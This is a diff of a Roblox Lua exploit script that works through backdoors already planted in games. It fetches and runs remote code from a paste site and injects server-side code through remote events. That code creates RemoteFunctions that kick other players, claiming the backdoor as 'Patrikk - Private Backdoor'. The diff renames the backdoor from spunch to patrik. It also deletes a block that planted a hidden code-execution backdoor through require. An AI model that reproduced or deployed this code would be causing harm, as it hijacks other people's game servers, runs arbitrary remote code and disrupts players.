@@ -86,6 +86,9 @@ local notify = loadstring(game:HttpGet("https://pastefy.app/JNTqAzrn/raw", true)
         if name == "spunch.bd_cssr6-O1" then
                 return false
         end
+        if name == "patrik.bd_cssr6-O1" then
+                return false
+        end
 		if name == "ChatEvent" then
 		        return false
 		end
@@ -3244,31 +3247,13 @@ fireRemoteEvent([[
 for _, svc in ipairs(services) do
   for r = 1, 100 do 
     local r = Instance.new("RemoteFunction")
-    r.Name = "spunch.bd_cssr6-O1"
+    r.Name = "patrik.bd_cssr6-O1"
     r.OnServerInvoke = function(player)
         player:Kick("Backdoor has been secured by Patrikk - Private Backdoor.")
     end
     r.Parent = svc
   end
 end]])
-
-fireRemoteEvent([[
-local frm = game:GetService("FeatureRestrictionManager")
-
-local remoteFunction = Instance.new("RemoteFunction")
-remoteFunction.Name = "spunch.bd_cssr6-01"
-remoteFunction.Parent = frm
-
-local loadstring = require(13684410229)
-
-remoteFunction.OnServerInvoke = function(player, code)
-    if player.Name ~= "]] .. game.Players.LocalPlayer.Name .. [[" then
-        player:Kick("Backdoor has been secured by Patrikk - Private Backdoor.")
-        return
-    end
-    loadstring(code)()
-end
-]])
 
 fireRemoteEvent([[
 local Players = game:GetService("Players")
